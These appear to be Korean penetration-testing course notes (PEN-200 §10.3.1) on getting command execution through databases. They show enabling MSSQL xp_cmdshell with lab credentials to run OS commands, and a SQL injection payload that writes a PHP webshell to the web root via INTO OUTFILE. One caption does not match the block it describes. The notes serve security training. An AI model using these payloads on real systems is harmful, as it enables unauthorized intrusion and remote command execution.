# 10.3.1 수동 코드 실행

> **Manual Code Execution** · PEN-200 §10.3.1

코드 실행 경로는 DBMS 마다 다름 — MSSQL 은 전용 함수가 있고, MySQL 은 파일 쓰기를 거쳐 우회함.

MSSQL 의 `xp_cmdshell` 은 문자열을 명령 셸에 넘겨 실행하고 출력을 텍스트 행으로 돌려주는 확장 프로시저임. 전제 셋 —

- **기본적으로 비활성**이라 먼저 켜야 함
- 켠 뒤에는 `SELECT` 가 아니라 **`EXECUTE`** 로 호출함
- 설정 변경 권한이 있는 계정이어야 함(예제는 `Administrator`)

활성화는 두 단계 — 고급 옵션 노출을 켜고 `RECONFIGURE` 로 반영, 다시 `xp_cmdshell` 을 켜고 `RECONFIGURE`.

```
kali@kali:~$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
...
SQL> EXECUTE sp_configure 'show advanced options', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options'
changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from
0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
```

*xp_cmdshell 활성화*

이후에는 임의의 Windows 명령을 실행할 수 있고, 실행 주체는 SQL 서비스 계정임.

```
SQL> EXECUTE xp_cmdshell 'whoami';
output
--------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------
nt service\mssql$sqlexpress
NULL
```

*xp_cmdshell 로 명령 실행*

여기까지 오면 SQL 셸을 리버스셸로 승격하는 것은 어렵지 않음.

MySQL 계열에는 이에 대응하는 단일 함수가 없어 **`SELECT ... INTO OUTFILE` 로 파일을 써서** 우회함. 전제는 **대상 경로가 DB 프로세스를 돌리는 OS 사용자에게 쓰기 가능**해야 한다는 것임.

앞 절의 UNION 페이로드를 확장해, 첫 컬럼에 PHP 한 줄을 싣고 웹 디렉터리에 웹셸로 떨어뜨림.

```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE
"/var/www/html/tmp/webshell.php" -- //
```

*INTO OUTFILE 로 웹셸 기록*

기록되는 코드는 `cmd` 파라미터로 받은 문자열을 `system()` 에 넘기는 형태라, 웹으로 접근 가능한 대화형 명령 셸처럼 동작함.

```
<? system($_REQUEST['cmd']); ?>
```

*웹셸 기록 시 반환되는 반환형 오류 — 실패로 보이지만 파일 기록 자체는 성공함*

⚠️ 이 오류를 실패로 오독하지 말 것. 반환 자료형 불일치일 뿐이라 **디스크 기록에는 영향이 없음** — 실제 확인은 `/tmp` 아래 생긴 웹셸에 `cmd=id` 로 접근해 보는 것임. 예제에서는 `www-data` 로 실행됨이 확인됨(리눅스 웹서버의 전형적 계정).
